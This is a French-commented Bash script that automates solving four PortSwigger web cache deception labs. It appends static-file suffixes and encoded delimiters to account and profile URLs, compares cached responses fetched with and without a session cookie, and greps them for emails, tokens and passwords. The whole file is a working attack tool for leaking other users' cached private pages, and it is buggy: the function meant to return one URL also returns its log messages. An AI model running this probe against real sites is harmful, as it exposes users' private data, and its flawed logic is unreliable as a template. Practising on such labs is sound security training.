#!/bin/bash

LAB_URL="https://votre-lab-portswigger.net"   # À personnaliser
COOKIE="session=..."                          # Si besoin
HEADERS="-H 'Cookie: $COOKIE'"

# Méthodologie d'analyse récursive
analyse_recursive() {
    local base_url="$1"
    local -a suffixes=("" "/fake.css" "/fake.js" "/assets/fake.css" "%23fake.css" "%2523fake.css")
    local found=0

    echo "[Analyse] Recherche récursive de surface d’attaque sur $base_url"
    for suffix in "${suffixes[@]}"; do
        test_url="${base_url}${suffix}"
        echo "  > Test de $test_url"
        # Vérification headers cache
        curl -s -D /tmp/headers_test.txt $HEADERS "$test_url" -o /dev/null
        if grep -iqE "cache|age|expires" /tmp/headers_test.txt; then
            echo "    => Headers cache détectés sur $test_url"
            found=1
            echo "$test_url"
            return 0
        fi
    done
    if [ "$found" -eq 0 ]; then
        echo "    => Aucun vecteur évident détecté, élargir la surface (autres endpoints, autres suffixes)..."
        return 1
    fi
}

# Détection automatique de données sensibles
detect_sensitive() {
    grep -E "email|session|token|admin|password|user" "$1"
}

# Challenge 1 : Web cache deception (basic)
wcd_basic() {
    echo "[1] Web cache deception (basic)"
    local endpoint="$LAB_URL/account"
    local attack_url=$(analyse_recursive "$endpoint")
    if [ -z "$attack_url" ]; then
        echo "  => Aucun vecteur de cache évident trouvé pour $endpoint."
        return
    fi

    # Attaque récursive
    echo "[Attaque] Injection sur $attack_url (authentifié)"
    curl -s -D /tmp/headers_auth.txt $HEADERS "$attack_url" -o /tmp/wcd_basic_auth.html
    echo "[Attaque] Injection sur $attack_url (non authentifié)"
    curl -s -D /tmp/headers_noauth.txt "$attack_url" -o /tmp/wcd_basic_noauth.html

    # Contrôle récursif
    echo "[Contrôle] Diff des réponses (auth vs non-auth) :"
    if diff /tmp/wcd_basic_auth.html /tmp/wcd_basic_noauth.html | grep -q .; then
        echo "  => Différences détectées."
        echo "[Contrôle] Recherche de données sensibles dans la réponse non-auth :"
        if detect_sensitive /tmp/wcd_basic_noauth.html; then
            echo "=> Vulnérabilité confirmée !"
        else
            echo "=> Différence mais pas de fuite évidente, relance analyse sur autre suffixe..."
            # Récursivité : on tente le prochain suffixe
            suffixes=("/fake.js" "/assets/fake.css" "%23fake.css" "%2523fake.css")
            for suffix in "${suffixes[@]}"; do
                attack_url="${endpoint}${suffix}"
                curl -s -D /tmp/headers_auth.txt $HEADERS "$attack_url" -o /tmp/wcd_basic_auth.html
                curl -s -D /tmp/headers_noauth.txt "$attack_url" -o /tmp/wcd_basic_noauth.html
                if diff /tmp/wcd_basic_auth.html /tmp/wcd_basic_noauth.html | grep -q .; then
                    if detect_sensitive /tmp/wcd_basic_noauth.html; then
                        echo "=> Vulnérabilité confirmée sur $attack_url !"
                        return
                    fi
                fi
            done
            echo "=> Aucun vecteur n’a permis de confirmer la fuite."
        fi
    else
        echo "  => Pas de différence détectée, relance analyse sur autre suffixe..."
        # Récursivité sur autres suffixes
        suffixes=("/fake.js" "/assets/fake.css" "%23fake.css" "%2523fake.css")
        for suffix in "${suffixes[@]}"; do
            attack_url="${endpoint}${suffix}"
            curl -s -D /tmp/headers_auth.txt $HEADERS "$attack_url" -o /tmp/wcd_basic_auth.html
            curl -s -D /tmp/headers_noauth.txt "$attack_url" -o /tmp/wcd_basic_noauth.html
            if diff /tmp/wcd_basic_auth.html /tmp/wcd_basic_noauth.html | grep -q .; then
                if detect_sensitive /tmp/wcd_basic_noauth.html; then
                    echo "=> Vulnérabilité confirmée sur $attack_url !"
                    return
                fi
            fi
        done
        echo "=> Aucun vecteur n’a permis de confirmer la fuite."
    fi
}

# Challenge 2 : Web cache deception with static extension
wcd_static_extension() {
    echo "[2] Web cache deception with static extension"
    local endpoint="$LAB_URL/profile"
    local attack_url=$(analyse_recursive "$endpoint")
    if [ -z "$attack_url" ]; then
        echo "  => Aucun vecteur de cache évident trouvé pour $endpoint."
        return
    fi

    echo "[Attaque] Injection sur $attack_url (authentifié)"
    curl -s -D /tmp/headers_auth.txt $HEADERS "$attack_url" -o /tmp/wcd_static_auth.html
    echo "[Attaque] Injection sur $attack_url (non authentifié)"
    curl -s -D /tmp/headers_noauth.txt "$attack_url" -o /tmp/wcd_static_noauth.html

    echo "[Contrôle] Diff des réponses (auth vs non-auth) :"
    if diff /tmp/wcd_static_auth.html /tmp/wcd_static_noauth.html | grep -q .; then
        echo "  => Différences détectées."
        if detect_sensitive /tmp/wcd_static_noauth.html; then
            echo "=> Vulnérabilité confirmée !"
        else
            echo "=> Différence mais pas de fuite évidente, relance analyse sur autre suffixe..."
            # Récursivité sur autres suffixes
            suffixes=("/fake.css" "/assets/fake.css" "%23fake.css" "%2523fake.css")
            for suffix in "${suffixes[@]}"; do
                attack_url="${endpoint}${suffix}"
                curl -s -D /tmp/headers_auth.txt $HEADERS "$attack_url" -o /tmp/wcd_static_auth.html
                curl -s -D /tmp/headers_noauth.txt "$attack_url" -o /tmp/wcd_static_noauth.html
                if diff /tmp/wcd_static_auth.html /tmp/wcd_static_noauth.html | grep -q .; then
                    if detect_sensitive /tmp/wcd_static_noauth.html; then
                        echo "=> Vulnérabilité confirmée sur $attack_url !"
                        return
                    fi
                fi
            done
            echo "=> Aucun vecteur n’a permis de confirmer la fuite."
        fi
    else
        echo "  => Pas de différence détectée, relance analyse sur autre suffixe..."
        suffixes=("/fake.css" "/assets/fake.css" "%23fake.css" "%2523fake.css")
        for suffix in "${suffixes[@]}"; do
            attack_url="${endpoint}${suffix}"
            curl -s -D /tmp/headers_auth.txt $HEADERS "$attack_url" -o /tmp/wcd_static_auth.html
            curl -s -D /tmp/headers_noauth.txt "$attack_url" -o /tmp/wcd_static_noauth.html
            if diff /tmp/wcd_static_auth.html /tmp/wcd_static_noauth.html | grep -q .; then
                if detect_sensitive /tmp/wcd_static_noauth.html; then
                    echo "=> Vulnérabilité confirmée sur $attack_url !"
                    return
                fi
            fi
        done
        echo "=> Aucun vecteur n’a permis de confirmer la fuite."
    fi
}

# Challenge 3 : Web cache deception with static directory
wcd_static_directory() {
    echo "[3] Web cache deception with static directory"
    local endpoint="$LAB_URL/account"
    local attack_url=$(analyse_recursive "${endpoint}/assets")
    if [ -z "$attack_url" ]; then
        echo "  => Aucun vecteur de cache évident trouvé pour $endpoint/assets."
        return
    fi

    echo "[Attaque] Injection sur $attack_url (authentifié)"
    curl -s -D /tmp/headers_auth.txt $HEADERS "$attack_url" -o /tmp/wcd_dir_auth.html
    echo "[Attaque] Injection sur $attack_url (non authentifié)"
    curl -s -D /tmp/headers_noauth.txt "$attack_url" -o /tmp/wcd_dir_noauth.html

    echo "[Contrôle] Diff des réponses (auth vs non-auth) :"
    if diff /tmp/wcd_dir_auth.html /tmp/wcd_dir_noauth.html | grep -q .; then
        echo "  => Différences détectées."
        if detect_sensitive /tmp/wcd_dir_noauth.html; then
            echo "=> Vulnérabilité confirmée !"
        else
            echo "=> Différence mais pas de fuite évidente, relance analyse sur autre suffixe..."
            # Récursivité sur autres suffixes
            suffixes=("/fake.css" "%23fake.css" "%2523fake.css")
            for suffix in "${suffixes[@]}"; do
                attack_url="${endpoint}/assets${suffix}"
                curl -s -D /tmp/headers_auth.txt $HEADERS "$attack_url" -o /tmp/wcd_dir_auth.html
                curl -s -D /tmp/headers_noauth.txt "$attack_url" -o /tmp/wcd_dir_noauth.html
                if diff /tmp/wcd_dir_auth.html /tmp/wcd_dir_noauth.html | grep -q .; then
                    if detect_sensitive /tmp/wcd_dir_noauth.html; then
                        echo "=> Vulnérabilité confirmée sur $attack_url !"
                        return
                    fi
                fi
            done
            echo "=> Aucun vecteur n’a permis de confirmer la fuite."
        fi
    else
        echo "  => Pas de différence détectée, relance analyse sur autre suffixe..."
        suffixes=("/fake.css" "%23fake.css" "%2523fake.css")
        for suffix in "${suffixes[@]}"; do
            attack_url="${endpoint}/assets${suffix}"
            curl -s -D /tmp/headers_auth.txt $HEADERS "$attack_url" -o /tmp/wcd_dir_auth.html
            curl -s -D /tmp/headers_noauth.txt "$attack_url" -o /tmp/wcd_dir_noauth.html
            if diff /tmp/wcd_dir_auth.html /tmp/wcd_dir_noauth.html | grep -q .; then
                if detect_sensitive /tmp/wcd_dir_noauth.html; then
                    echo "=> Vulnérabilité confirmée sur $attack_url !"
                    return
                fi
            fi
        done
        echo "=> Aucun vecteur n’a permis de confirmer la fuite."
    fi
}

# Challenge 4 : Web cache deception with delimiter
wcd_delimiter() {
    echo "[4] Web cache deception with delimiter"
    local endpoint="$LAB_URL/account"
    local attack_url=$(analyse_recursive "$endpoint")
    if [ -z "$attack_url" ]; then
        echo "  => Aucun vecteur de cache évident trouvé pour $endpoint."
        return
    fi

    echo "[Attaque] Injection sur $attack_url (authentifié)"
    curl -s -D /tmp/headers_auth.txt $HEADERS "$attack_url" -o /tmp/wcd_delim_auth.html
    echo "[Attaque] Injection sur $attack_url (non authentifié)"
    curl -s -D /tmp/headers_noauth.txt "$attack_url" -o /tmp/wcd_delim_noauth.html

    echo "[Contrôle] Diff des réponses (auth vs non-auth) :"
    if diff /tmp/wcd_delim_auth.html /tmp/wcd_delim_noauth.html | grep -q .; then
        echo "  => Différences détectées."
        if detect_sensitive /tmp/wcd_delim_noauth.html; then
            echo "=> Vulnérabilité confirmée !"
        else
            echo "=> Différence mais pas de fuite évidente, relance analyse sur autre suffixe..."
            # Récursivité sur autres suffixes
            suffixes=("%23fake.css" "%2523fake.css")
            for suffix in "${suffixes[@]}"; do
                attack_url="${endpoint}${suffix}"
                curl -s -D /tmp/headers_auth.txt $HEADERS "$attack_url" -o /tmp/wcd_delim_auth.html
                curl -s -D /tmp/headers_noauth.txt "$attack_url" -o /tmp/wcd_delim_noauth.html
                if diff /tmp/wcd_delim_auth.html /tmp/wcd_delim_noauth.html | grep -q .; then
                    if detect_sensitive /tmp/wcd_delim_noauth.html; then
                        echo "=> Vulnérabilité confirmée sur $attack_url !"
                        return
                    fi
                fi
            done
            echo "=> Aucun vecteur n’a permis de confirmer la fuite."
        fi
    else
        echo "  => Pas de différence détectée, relance analyse sur autre suffixe..."
        suffixes=("%23fake.css" "%2523fake.css")
        for suffix in "${suffixes[@]}"; do
            attack_url="${endpoint}${suffix}"
            curl -s -D /tmp/headers_auth.txt $HEADERS "$attack_url" -o /tmp/wcd_delim_auth.html
            curl -s -D /tmp/headers_noauth.txt "$attack_url" -o /tmp/wcd_delim_noauth.html
            if diff /tmp/wcd_delim_auth.html /tmp/wcd_delim_noauth.html | grep -q .; then
                if detect_sensitive /tmp/wcd_delim_noauth.html; then
                    echo "=> Vulnérabilité confirmée sur $attack_url !"
                    return
                fi
            fi
        done
        echo "=> Aucun vecteur n’a permis de confirmer la fuite."
    fi
}

# MENU PRINCIPAL
main_menu() {
    echo
    echo "PortSwigger Web Cache Deception Challenges (méthodologie récursive)"
    echo "-------------------------------------------------------------------"
    echo "1. [1] Web cache deception (basic)"
    echo "2. [2] Web cache deception with static extension"
    echo "3. [3] Web cache deception with static directory"
    echo "4. [4] Web cache deception with delimiter"
    echo "q. Quit"
    echo
    read -p "Choisissez un challenge (1-4, q pour quitter) : " choix

    case $choix in
        1) wcd_basic; main_menu ;;
        2) wcd_static_extension; main_menu ;;
        3) wcd_static_directory; main_menu ;;
        4) wcd_delimiter; main_menu ;;
        q) echo "Sortie." ;;
        *) echo "Choix invalide."; main_menu ;;
    esac
}

main_menu
